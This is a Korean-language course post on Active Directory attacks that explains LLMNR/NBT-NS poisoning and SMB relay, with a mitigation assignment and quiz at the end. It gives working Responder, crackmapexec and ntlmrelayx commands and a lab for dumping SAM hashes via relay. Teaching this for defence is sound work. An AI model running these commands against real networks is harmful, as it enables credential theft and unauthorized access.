---
layout: post
title: "Offensive AD & APT Mastery: Week 5 - Credential Access I - No-auth Attacks (LLMNR/SMB Relay)"
---

AD 해킹의 8할은 **"남의 계정 훔치기"**입니다.
그런데, 아이디/비번을 몰라도 네트워크에 연결만 되어 있으면 해시(Hash)를 훔칠 수 있습니다.

윈도우는 너무 친절해서 탈입니다.
"야, 파일 서버 어딨어?"라고 누가 소리치면, 해커가 "나야!"라고 답해도 믿어버립니다. 이것이 **LLMNR/NBT-NS Poisoning**입니다.

---

## 1. LLMNR & NBT-NS Poisoning

사용자가 존재하지 않는 서버(`\\pritner`)를 찾으려고 하면, DNS가 모른다고 합니다.
그럼 윈도우는 로컬 네트워크 전체에 소리칩니다(Broadcast). "누구 `pritner` 아는 사람?"

이때 해커의 도구(**Responder**)가 답합니다.
**"내가 `pritner`야. 나한테 인증해."**

사용자의 PC는 해커에게 **NTLMv2 Hash**를 보냅니다.
해커는 이 해시를 받아서:
1.  오프라인에서 깹니다 (Hashcat).
2.  다른 서버에 던집니다 (Relay).

---

## 2. SMB Relay Attack

해시를 깨는 건 시간이 걸립니다. (비번이 복잡하면 못 깸)
하지만 **Relay(중계)**는 즉시 관리자 권한을 줍니다.

**시나리오:**
1.  피해자(PC A)가 해커에게 인증을 시도함.
2.  해커는 이 인증 패킷을 그대로 **타겟 서버(PC B)**에게 전달함.
3.  PC B: "어, PC A의 관리자네? 접속 허용."
4.  해커는 PC B에 쉘을 얻음.

**조건:**
*   **SMB Signing**이 꺼져 있어야 함. (대부분의 클라이언트 PC는 꺼져 있음!)
*   피해자 계정이 타겟 서버의 **로컬 관리자**여야 함.

---

## 3. Tools of the Trade

### Responder
포이즈닝 도구의 최강자입니다.
```bash
sudo responder -I eth0 -dwv
```
이거 켜두고 점심 먹고 오면 해시가 수두룩하게 쌓여 있습니다.

### ntlmrelayx.py (Impacket)
해시를 받아서 다른 곳으로 쏘는 도구입니다.
```bash
# SMB Signing 안 된 호스트 찾기
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# Relay 공격 준비 (SOCKS Proxy 모드)
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

---

## 🛠️ Lab: The Relay Attack

1.  **Responder 설정:** `Responder.conf`에서 `SMB`와 `HTTP` 서버를 끕니다. (Relay 할 거니까)
2.  **ntlmrelayx 실행:** 타겟 IP를 지정하여 실행합니다.
3.  **트리거:** 피해자 PC에서 `\\attacker_ip`로 접속을 시도하게 만듭니다. (탐색기에 주소 입력)
4.  **결과:** ntlmrelayx 화면에 `SAM hashes dumped` 또는 `SOCKS proxy started`가 뜨는지 확인합니다.

---

## 📝 5주차 과제: Mitigation Strategy

**목표:** 이 치명적인 공격을 막기 위한 방어 전략을 수립하세요.

1.  **LLMNR/NBT-NS:** GPO를 통해 비활성화하는 방법을 조사하세요.
2.  **SMB Relay:** `SMB Signing`을 강제(Require)하면 왜 막히는지 원리를 설명하세요.
    *   힌트: 해커가 패킷을 변조(중계)하면 서명이 깨짐.
3.  이 설정들을 적용했을 때 발생할 수 있는 부작용(Legacy 장비 호환성 등)은 무엇인가요?

---

## ✅ Self-Assessment Quiz

1.  **Q1.** 윈도우 네트워크에서 DNS 조회 실패 시 로컬 네트워크 브로드캐스트를 통해 이름을 확인하는 프로토콜 두 가지는? (LLMNR, NBT-NS)
2.  **Q2.** SMB Relay 공격을 근본적으로 차단하기 위해 모든 워크스테이션과 서버에 적용해야 하는 보안 설정은? (SMB Signing - Digitally sign communications)
3.  **Q3.** Responder를 통해 수집한 NTLMv2 해시를 오프라인에서 크랙하기 위해 사용하는 대표적인 도구는? (Hashcat 또는 John the Ripper)

---

다음 주, 드디어 **Kerberos**를 건드립니다.
서비스 계정의 비밀번호를 털어가는 **Kerberoasting**과 **AS-REP Roasting**을 실습합니다.

**Poison the well.**
